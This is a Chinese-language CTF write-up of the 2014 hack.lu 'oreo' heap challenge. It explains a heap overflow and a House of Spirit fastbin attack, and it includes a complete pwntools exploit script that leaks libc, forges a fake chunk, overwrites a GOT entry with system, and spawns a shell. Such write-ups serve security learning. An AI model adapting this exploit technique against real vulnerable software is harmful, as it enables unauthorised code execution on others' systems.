---
title: 2014 hack.lu oreo (House Of Spirit)
date: 2018-04-06 08:53:15
categories: 
- CTF
- Fastbin-Double-Free
- House-Of-Spirit
---

## 基本分析

    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
可以看出，程序确实是比较老的，32位程序，动态链接，就连 RELRO 技术也没有上。



## 基本功能分析

结构体：

```
00000000 rifle           struc ; (sizeof=0x38, mappedto_5)
00000000 descript        db 25 dup(?)
00000019 name            db 27 dup(?)
00000034 next            dd ?                    ; offset
00000038 rifle           ends
```

- 添加枪支，其主要会读取枪支的名字与描述。但问题在于读取的名字的长度过长，可以覆盖 next 指针以及后面堆块的数据。可以覆盖后面堆块的数据大小为 56-(56-27)=27 大小。需要注意的是，这些枪支的大小都是在fastbin 范围内的。
- 展示添加枪支，即从头到尾输出枪支的描述与名字。
- 订已经选择的枪支，即将所有已经添加的枪支释放掉，但是并没有置为NULL。
- 留下订货消息
- 展示目前状态，即添加了多少只枪，订了多少单，留下了什么信息。



## 利用

基本利用思路如下

1. 由于程序存在堆溢出漏洞，而且还可以控制 next 指针，我们可以直接控制 next 指针指向程序中 got 表的位置。当进行展示的时候，即可以输出对应的内容，这里同时需要确保假设对应地址为一个枪支结构体时，其 next 指针为 NULL。这里我采用 puts@got。通过这样的操作，我们就可以获得出 libc 基地址，以及 system 函数地址。
2. 由于枪支结构体大小是 0x38 大小，所以其对应的 chunk 为 0x40。这里采用 `house of sprit` 的技术来返回 0x0804A2A8 处的chunk，即留下的消息的指针。因此，我们需要设置 0x0804A2A4 处的内容为 0x40，即需要添加 0x40 支枪支，从而绕过大小检测。同时为了确保可以绕过 next chunk 的检测，这里我们编辑留下的消息。
3. 在成功分配这样的 chunk 后，我们其实就有了一个任意地址修改的漏洞，这里我们可以选择修改一个合适的 got 项为 system 地址，从而获得 shell。



```Python
from pwn import *
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
if args['DEBUG']:
    context.log_level = 'debug'
context.binary = "./oreo"
oreo = ELF("./oreo")
if args['REMOTE']:
    p = remote(ip, port)
else:
    p = process("./oreo")
log.info('PID: ' + str(proc.pidof(p)[0]))
libc = ELF('./libc.so.6')


def add(descrip, name):
    p.sendline('1')
    #p.recvuntil('Rifle name: ')
    p.sendline(name)
    #p.recvuntil('Rifle description: ')
    #sleep(0.5)
    p.sendline(descrip)


def show_rifle():
    p.sendline('2')
    p.recvuntil('===================================\n')


def order():
    p.sendline('3')


def message(notice):
    p.sendline('4')
    #p.recvuntil("Enter any notice you'd like to submit with your order: ")
    p.sendline(notice)


def exp():
    print 'step 1. leak libc base'
    name = 27 * 'a' + p32(oreo.got['puts'])
    add(25 * 'a', name)
    show_rifle()
    p.recvuntil('===================================\n')
    p.recvuntil('Description: ')
    puts_addr = u32(p.recvuntil('\n', drop=True)[:4])
    log.success('puts addr: ' + hex(puts_addr))
    libc_base = puts_addr - libc.symbols['puts']
    system_addr = libc_base + libc.symbols['system']
    binsh_addr = libc_base + next(libc.search('/bin/sh'))

    print 'step 2. free fake chunk at 0x0804A2A8'

    # now, oifle_cnt=1, we need set it = 0x40
    oifle = 1
    while oifle < 0x3f:
        # set next link=NULL
        add(25 * 'a', 'a' * 27 + p32(0))
        oifle += 1
    payload = 'a' * 27 + p32(0x0804a2a8)
    # set next link=0x0804A2A8, try to free a fake chunk
    add(25 * 'a', payload)
    # before free, we need to bypass some check
    # fake chunk's size is 0x40
    # 0x20 *'a' for padding the last fake chunk
    # 0x40 for fake chunk's next chunk's prev_size
    # 0x100 for fake chunk's next chunk's size
    # set fake iofle' next to be NULL
    payload = 0x20 * '\x00' + p32(0x40) + p32(0x100)
    payload = payload.ljust(52, 'b')
    payload += p32(0)
    payload = payload.ljust(128, 'c')
    message(payload)
    # fastbin 0x40: 0x0804A2A0->some where heap->NULL
    order()
    p.recvuntil('Okay order submitted!\n')

    print 'step 3. get shell'
    # modify free@got to system addr
    payload = p32(oreo.got['strlen']).ljust(20, 'a')
    add(payload, 'b' * 20)
    log.success('system addr: ' + hex(system_addr))
    #gdb.attach(p)
    message(p32(system_addr) + ';/bin/sh\x00')

    p.interactive()


if __name__ == "__main__":
    exp()
```



## 参考

https://ctf-wiki.github.io/ctf-wiki/pwn/heap/fastbin_attack/#2014-hacklu-oreo







